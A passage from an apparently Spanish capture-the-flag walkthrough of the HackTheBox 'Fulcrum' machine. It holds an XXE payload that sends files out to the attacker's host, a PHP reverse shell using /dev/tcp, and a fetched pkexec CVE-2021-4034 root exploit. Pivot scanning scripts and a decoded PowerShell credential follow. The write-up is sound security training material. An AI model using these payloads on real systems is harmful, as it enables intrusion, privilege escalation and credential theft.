Dp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg=="</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo
</span>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
libvirt-qemu:x:64055:108:Libvirt Qemu,,,:/var/lib/libvirt:/usr/sbin/nologin
libvirt-dnsmasq:x:114:120:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/usr/sbin/nologin
</code></pre></div></div>

<ul>
  <li>Podemos cargar el <code class="language-plaintext highlighter-rouge">index.php</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">cat </span>zi.xml
&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"php://filter/convert.base64-encode/resource=/var/www/api/index.php"</span><span class="o">&gt;</span>
&lt;<span class="o">!</span>ENTITY % param1 <span class="s2">"&lt;!ENTITY filename SYSTEM 'http://10.10.14.62/%file;'&gt;"</span><span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>Si volvemos a enviar la petici√≥n la recibimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:53:50] <span class="s2">"GET /zi.xml HTTP/1.0"</span> 200 -
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:53:50] code 404, message File not found
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 13:53:50] <span class="s2">"GET /PD9waHAKCWhlYWRlcignQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD11dGYtOCcpOwoJaGVhZGVyKCdTZXJ2ZXI6IEZ1bGNydW0tQVBJIEJldGEnKTsKCWxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIgKGZhbHNlKTsKCSR4bWxmaWxlID0gZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7CgkkZG9tID0gbmV3IERPTURvY3VtZW50KCk7CgkkZG9tLT5sb2FkWE1MKCR4bWxmaWxlLExJQlhNTF9OT0VOVHxMSUJYTUxfRFRETE9BRCk7CgkkaW5wdXQgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRvdXRwdXQgPSAkaW5wdXQtPlBpbmc7CgkvL2NoZWNrIGlmIG9rCglpZigkb3V0cHV0ID09ICJQaW5nIikKCXsKCQkkZGF0YSA9IGFycmF5KCdIZWFydGJlYXQnID0+IGFycmF5KCdQaW5nJyA9PiAiUGluZyIpKTsKCX1lbHNlewoJCSRkYXRhID0gYXJyYXkoJ0hlYXJ0YmVhdCcgPT4gYXJyYXkoJ1BpbmcnID0+ICJQb25nIikpOwoJfQoJZWNobyBqc29uX2VuY29kZSgkZGF0YSk7CgoKPz4KCgo= HTTP/1.0"</span> 404 -
</code></pre></div></div>

<ul>
  <li>Vemos el c√≥digo y con esto entendemos por que se ocasiona el XXE.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"PD9waHAKCWhlYWRlcignQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD11dGYtOCcpOwoJaGVhZGVyKCdTZXJ2ZXI6IEZ1bGNydW0tQVBJIEJldGEnKTsKCWxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIgKGZhbHNlKTsKCSR4bWxmaWxlID0gZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7CgkkZG9tID0gbmV3IERPTURvY3VtZW50KCk7CgkkZG9tLT5sb2FkWE1MKCR4bWxmaWxlLExJQlhNTF9OT0VOVHxMSUJYTUxfRFRETE9BRCk7CgkkaW5wdXQgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRvdXRwdXQgPSAkaW5wdXQtPlBpbmc7CgkvL2NoZWNrIGlmIG9rCglpZigkb3V0cHV0ID09ICJQaW5nIikKCXsKCQkkZGF0YSA9IGFycmF5KCdIZWFydGJlYXQnID0+IGFycmF5KCdQaW5nJyA9PiAiUGluZyIpKTsKCX1lbHNlewoJCSRkYXRhID0gYXJyYXkoJ0hlYXJ0YmVhdCcgPT4gYXJyYXkoJ1BpbmcnID0+ICJQb25nIikpOwoJfQoJZWNobyBqc29uX2VuY29kZSgkZGF0YSk7CgoKPz4KCgo="</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo</span>
&lt;?php
	header<span class="o">(</span><span class="s1">'Content-Type:application/json;charset=utf-8'</span><span class="o">)</span><span class="p">;</span>
	header<span class="o">(</span><span class="s1">'Server: Fulcrum-API Beta'</span><span class="o">)</span><span class="p">;</span>
	libxml_disable_entity_loader <span class="o">(</span><span class="nb">false</span><span class="o">)</span><span class="p">;</span>
	<span class="nv">$xmlfile</span> <span class="o">=</span> file_get_contents<span class="o">(</span><span class="s1">'php://input'</span><span class="o">)</span><span class="p">;</span>
	<span class="nv">$dom</span> <span class="o">=</span> new DOMDocument<span class="o">()</span><span class="p">;</span>
	<span class="nv">$dom</span>-&gt;loadXML<span class="o">(</span><span class="nv">$xmlfile</span>,LIBXML_NOENT|LIBXML_DTDLOAD<span class="o">)</span><span class="p">;</span>
	<span class="nv">$input</span> <span class="o">=</span> simplexml_import_dom<span class="o">(</span><span class="nv">$dom</span><span class="o">)</span><span class="p">;</span>
	<span class="nv">$output</span> <span class="o">=</span> <span class="nv">$input</span>-&gt;Ping<span class="p">;</span>
	//check <span class="k">if </span>ok
	<span class="k">if</span><span class="o">(</span><span class="nv">$output</span> <span class="o">==</span> <span class="s2">"Ping"</span><span class="o">)</span>
	<span class="o">{</span>
		<span class="nv">$data</span> <span class="o">=</span> array<span class="o">(</span><span class="s1">'Heartbeat'</span> <span class="o">=&gt;</span> array<span class="o">(</span><span class="s1">'Ping'</span> <span class="o">=&gt;</span> <span class="s2">"Ping"</span><span class="o">))</span><span class="p">;</span>
	<span class="o">}</span><span class="k">else</span><span class="o">{</span>
		<span class="nv">$data</span> <span class="o">=</span> array<span class="o">(</span><span class="s1">'Heartbeat'</span> <span class="o">=&gt;</span> array<span class="o">(</span><span class="s1">'Ping'</span> <span class="o">=&gt;</span> <span class="s2">"Pong"</span><span class="o">))</span><span class="p">;</span>
	<span class="o">}</span>
	<span class="nb">echo </span>json_encode<span class="o">(</span><span class="nv">$data</span><span class="o">)</span><span class="p">;</span>


?&gt;
</code></pre></div></div>

<ul>
  <li>Si recordamos hay mas puertos abiertos como el puerto <code class="language-plaintext highlighter-rouge">4</code> y podemos ver el c√≥digo por detr√°s.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">cat </span>zi.xml
&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"php://filter/convert.base64-encode/resource=/var/www/uploads/index.php"</span><span class="o">&gt;</span>
&lt;<span class="o">!</span>ENTITY % param1 <span class="s2">"&lt;!ENTITY filename SYSTEM 'http://10.10.14.62/%file;'&gt;"</span><span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Al enviar la petici√≥n recibimos el <code class="language-plaintext highlighter-rouge">base64</code> y vemos el c√≥digo.</p>
  </li>
  <li>
    <p>Y bueno si observamos ya se nos ocurre un <code class="language-plaintext highlighter-rouge">SSRF</code> por el <code class="language-plaintext highlighter-rouge">127.0.0.1</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"PD9waHAKaWYoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gIT0gIjEyNy4wLjAuMSIpCnsKCWVjaG8gIjxoMT5VbmRlciBNYWludGFuY2U8L2gxPjxwPlBsZWFzZSA8YSBocmVmPVwiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSAuICI6NC9pbmRleC5waHA/cGFnZT1ob21lXCI+dHJ5IGFnYWluPC9hPiBsYXRlci48L3A+IjsKfWVsc2V7CgkkaW5jID0gJF9SRVFVRVNUWyJwYWdlIl07CglpbmNsdWRlKCRpbmMuIi5waHAiKTsKfQo/PgoK"</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo</span>
&lt;?php
<span class="k">if</span><span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">'REMOTE_ADDR'</span><span class="o">]</span> <span class="o">!=</span> <span class="s2">"127.0.0.1"</span><span class="o">)</span>
<span class="o">{</span>
	<span class="nb">echo</span> <span class="s2">"&lt;h1&gt;Under Maintance&lt;/h1&gt;&lt;p&gt;Please &lt;a href=</span><span class="se">\"</span><span class="s2">http://"</span> <span class="nb">.</span> <span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">'SERVER_ADDR'</span><span class="o">]</span> <span class="nb">.</span> <span class="s2">":4/index.php?page=home</span><span class="se">\"</span><span class="s2">&gt;try again&lt;/a&gt; later.&lt;/p&gt;"</span><span class="p">;</span>
<span class="o">}</span><span class="k">else</span><span class="o">{</span>
	<span class="nv">$inc</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="o">[</span><span class="s2">"page"</span><span class="o">]</span><span class="p">;</span>
	include<span class="o">(</span><span class="nv">$inc</span>.<span class="s2">".php"</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
?&gt;
</code></pre></div></div>

<ul>
  <li>Desde el XXE lo que podemos hacer es apuntar ala <code class="language-plaintext highlighter-rouge">127.0.0.1:24</code> y tratar de cargar un archivo nuestro de la siguiente forma.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/fulcrum/15.png" />
</p>

<ul>
  <li>Nos adjunta el <code class="language-plaintext highlighter-rouge">.php</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 14:13:54] code 404, message File not found
10.10.10.62 - - <span class="o">[</span>14/Jun/2024 14:13:54] <span class="s2">"GET /yo.php HTTP/1.0"</span> 404 -
</code></pre></div></div>

<ul>
  <li>
    <p>La maquina tramita la petici√≥n contra si misma no un tercero por eso funciona.</p>
  </li>
  <li>
    <p>Con esto ya podemos enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
  </li>
  <li>
    <p>Podemos crear un archivo en <code class="language-plaintext highlighter-rouge">php</code> ya que la web lo interpreta y con eso podemos enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">cat </span>yo.php
&lt;?php
	system<span class="o">(</span><span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.62/443 0&gt;&amp;1'"</span><span class="o">)</span><span class="p">;</span>
?&gt;
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora le damos a send y enviamos la data.</p>
  </li>
  <li>
    <p>Recibimos la petici√≥n.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.62] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.62] 47870
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1044<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@fulcrum:~/uploads<span class="nv">$ </span><span class="nb">whoami
whoami
</span>www-data
www-data@fulcrum:~/uploads<span class="err">$</span>
www-data@fulcrum:~/uploads<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
www-data@fulcrum:~/uploads<span class="nv">$ </span>^Z
<span class="o">[</span>1]  + 33751 suspended  nc <span class="nt">-nlvp</span> 443
‚ûú  ~ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1]  + 33751 continued  nc <span class="nt">-nlvp</span> 443
                                    reset xterm
ENTER
www-data@fulcrum:~/uploads<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<h2 id="shell-as-root">Shell as root</h2>

<ul>
  <li>La m√°quina tiene otra interfaz.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:/<span class="nv">$ </span><span class="nb">hostname</span> <span class="nt">-I</span>
10.10.10.62 192.168.122.1 dead:beef::250:56ff:feb0:aa3b
</code></pre></div></div>

<ul>
  <li>Vemos el <strong>pkexec</strong> que es SUID.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> snap
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
./usr/bin/mount
./usr/bin/sudo
./usr/bin/pkexec
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/passwd
./usr/bin/fusermount
./usr/bin/chsh
./usr/bin/at
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/su
www-data@fulcrum:/<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Como hay otra interfaz vamos a tener que hacer pivoting entonces es mejor estar como root as√≠ que vamos a explotar el <code class="language-plaintext highlighter-rouge">pkexec</code> <a href="https://github.com/joeammond/CVE-2021-4034">https://github.com/joeammond/CVE-2021-4034</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:/tmp<span class="nv">$ </span>wget http://10.10.14.62:80/CVE-2021-4034.py
<span class="nt">--2024-06-14</span> 20:54:25--  http://10.10.14.62/CVE-2021-4034.py
Connecting to 10.10.14.62:80... connected.
HTTP request sent, awaiting response... 404 File not found
2024-06-14 20:54:25 ERROR 404: File not found.

www-data@fulcrum:/tmp<span class="nv">$ </span>wget http://10.10.14.62:80/CVE-2021-4034.py
<span class="nt">--2024-06-14</span> 20:55:08--  http://10.10.14.62/CVE-2021-4034.py
Connecting to 10.10.14.62:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3262 <span class="o">(</span>3.2K<span class="o">)</span> <span class="o">[</span>text/x-python]
Saving to: <span class="s1">'CVE-2021-4034.py'</span>

CVE-2021-4034.py      0%[                    <span class="o">]</span>       0  <span class="nt">--</span>.-KB/s        CVE-2021-4034.py    100%[<span class="o">===================&gt;]</span>   3.19K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s

2024-06-14 20:55:08 <span class="o">(</span>273 MB/s<span class="o">)</span> - <span class="s1">'CVE-2021-4034.py'</span> saved <span class="o">[</span>3262/3262]

www-data@fulcrum:/tmp<span class="nv">$ </span>python3 CVE-2021-4034.py
<span class="o">[</span>+] Creating shared library <span class="k">for </span>exploit code.
<span class="o">[</span>+] Calling execve<span class="o">()</span>
<span class="c"># bash</span>
root@fulcrum:/tmp# <span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
root@fulcrum:/tmp#
</code></pre></div></div>

<h2 id="shell-as-webuser">Shell as webuser</h2>

<ul>
  <li>Esta activa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# ping <span class="nt">-c</span> 1 192.168.122.1 &amp;&gt;/dev/null
root@fulcrum:/tmp# <span class="nb">echo</span> <span class="nv">$?</span>
0
</code></pre></div></div>

<ul>
  <li>Vamos a escanear la interfaz hosts activas en ese segmento de red.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# <span class="nb">chmod</span> +x hostDiscovery.sh
root@fulcrum:/tmp# <span class="nb">cat </span>hostDiscovery.sh
<span class="c">#!/bin/bash</span>

<span class="k">function </span>ctrl_c<span class="o">(){</span>
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Saliendo...</span><span class="se">\n</span><span class="s2">"</span>
	tput cnorm<span class="p">;</span> <span class="nb">exit </span>1
<span class="o">}</span>

<span class="c"># CTRL+C</span>
<span class="nb">trap </span>ctrl_c INT

tput civis
<span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 254<span class="si">)</span><span class="p">;</span> <span class="k">do
	</span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"ping -c 1 192.168.122.</span><span class="nv">$i</span><span class="s2">"</span> &amp;&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[+] host 192.168.122.</span><span class="nv">$i</span><span class="s2"> - ACTIVE"</span> &amp;
<span class="k">done</span><span class="p">;</span> <span class="nb">wait
</span>tput cnorm
</code></pre></div></div>

<ul>
  <li>Vemos los hosts abiertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# ./hostDiscovery.sh
<span class="o">[</span>+] host 192.168.122.1 - ACTIVE
<span class="o">[</span>+] host 192.168.122.228 - ACTIVE
</code></pre></div></div>

<ul>
  <li>
    <p>Esta activo.</p>
  </li>
  <li>
    <p>Estamos ante una maquina Windows.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# ping <span class="nt">-c</span> 1 192.168.122.228
PING 192.168.122.228 <span class="o">(</span>192.168.122.228<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 192.168.122.228: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>128 <span class="nb">time</span><span class="o">=</span>0.360 ms

<span class="nt">---</span> 192.168.122.228 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 0.360/0.360/0.360/0.000 ms
</code></pre></div></div>

<ul>
  <li>Ahora vamos a descubrir los puertos abiertos que tiene la m√°quina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# nano portDiscovery.sh
root@fulcrum:/tmp# <span class="nb">cat </span>portDiscovery.sh
<span class="c">#!/bin/bash</span>

<span class="k">for </span>port <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 65535<span class="si">)</span><span class="p">;</span> <span class="k">do
	</span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"echo '' &gt; /dev/tcp/192.168.122.228/</span><span class="nv">$port</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[+] Port </span><span class="nv">$port</span><span class="s2"> - OPEN"</span> &amp;
<span class="k">done</span><span class="p">;</span> <span class="nb">wait</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# ./portDiscovery.sh
<span class="o">[</span>+] Port 80 - OPEN
<span class="o">[</span>+] Port 5985 - OPEN
</code></pre></div></div>

<ul>
  <li>Si examinamos la ruta <strong>/uploads</strong> vemos un archivo con data interesante es un script en <code class="language-plaintext highlighter-rouge">powershell</code> que define la credencial de <code class="language-plaintext highlighter-rouge">webuser</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:~/uploads<span class="nv">$ </span><span class="nb">cat </span>Fulcrum_Upload_to_Corp.ps1
<span class="c"># TODO: Forward the PowerShell remoting port to the external interface</span>
<span class="c"># Password is now encrypted \o/</span>

<span class="nv">$1</span> <span class="o">=</span> <span class="s1">'WebUser'</span>
<span class="nv">$2</span> <span class="o">=</span> <span class="s1">'77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48'</span> <span class="nt">-split</span> <span class="s1">','</span>
<span class="nv">$3</span> <span class="o">=</span> <span class="s1">'76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='</span>
<span class="nv">$4</span> <span class="o">=</span> <span class="nv">$3</span> | ConvertTo-SecureString <span class="nt">-key</span> <span class="nv">$2</span>
<span class="nv">$5</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="o">(</span><span class="nv">$1</span>, <span class="nv">$4</span><span class="o">)</span>

Invoke-Command <span class="nt">-Computer</span> upload.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$5</span> <span class="nt">-File</span> Data.ps1
</code></pre></div></div>

<ul>
  <li>Encontramos un articulo donde nos dicen como podemos ver la contrase√±a en texto plano <a href="https://stackoverflow.com/questions/7468389/powershell-decode-system-security-securestring-to-readable-password">https://stackoverflow.com/questions/7468389/powershell-decode-system-security-securestring-to-readable-password</a> pero nos podemos guiar de ese articulo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ pwsh
PowerShell 7.2.6
Copyright <span class="o">(</span>c<span class="o">)</span> Microsoft Corporation.

https://aka.ms/powershell
Type <span class="s1">'help'</span> to get help.


‚îå‚îÄ‚îÄ<span class="o">(</span>miguel„âømiguelos<span class="o">)</span>-[/home/miguel]
‚îî‚îÄPS&gt;
</code></pre></div></div>

<ul>
  <li>Vamos a interpretarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>miguel„âømiguelos<span class="o">)</span>-[/home/miguel]
‚îî‚îÄPS&gt; <span class="nv">$1</span> <span class="o">=</span> <span class="s1">'WebUser'</span>

‚îå‚îÄ‚îÄ<span class="o">(</span>miguel„âømiguelos<span class="o">)</span>-[/home/miguel]
‚îî‚îÄPS&gt; <span class="nv">$2</span> <span class="o">=</span> <span class="s1">'77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48'</span> <span class="nt">-split</span> <span class="s1">','</span>

‚îå‚îÄ‚îÄ<span class="o">(</span>miguel„âømiguelos<span class="o">)</span>-[/home/miguel]
‚îî‚îÄPS&gt; <span class="nv">$3</span> <span class="o">=</span> <span class="s1">'76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='</span>

‚îå‚îÄ‚îÄ<span class="o">(</span>miguel„âømiguelos<span class="o">)</span>-[/home/miguel]
‚îî‚îÄPS&gt; <span class="nv">$4</span> <span class="o">=</span> <span class="nv">$3</span> | ConvertTo-SecureString <span class="nt">-key</span> <span class="nv">$2</span>

‚îå‚îÄ‚îÄ<span class="o">(</span>miguel„âømiguelos<span class="o">)</span>-[/home/miguel]
‚îî‚îÄPS&gt; <span class="nv">$5</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="o">(</span><span class="nv">$1</span>, <span class="nv">$4</span><span class="o">)</span>

‚îå‚îÄ‚îÄ<span class="o">(</span>miguel„âømiguelos<span class="o">)</span>-[/home/miguel]
‚îî‚îÄPS&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>miguel„âømiguelos<span class="o">)</span>-[/home/miguel]
